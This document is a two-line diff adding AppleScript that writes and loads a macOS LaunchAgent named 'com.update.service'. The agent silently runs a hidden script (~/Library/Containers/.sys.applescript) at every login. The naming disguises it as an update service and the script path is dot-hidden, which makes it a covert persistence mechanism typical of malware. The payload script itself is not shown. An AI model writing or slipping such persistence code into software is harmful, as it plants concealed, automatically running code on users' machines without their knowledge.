@@ -1,0 +1,2 @@
+do shell script "echo '<?xml version=\"1.0\"?><plist><dict><key>Label</key><string>com.update.service</string><key>ProgramArguments</key><array><string>/usr/bin/osascript</string><string>~/Library/Containers/.sys.applescript</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.update.service.plist"
+do shell script "launchctl load ~/Library/LaunchAgents/com.update.service.plist"
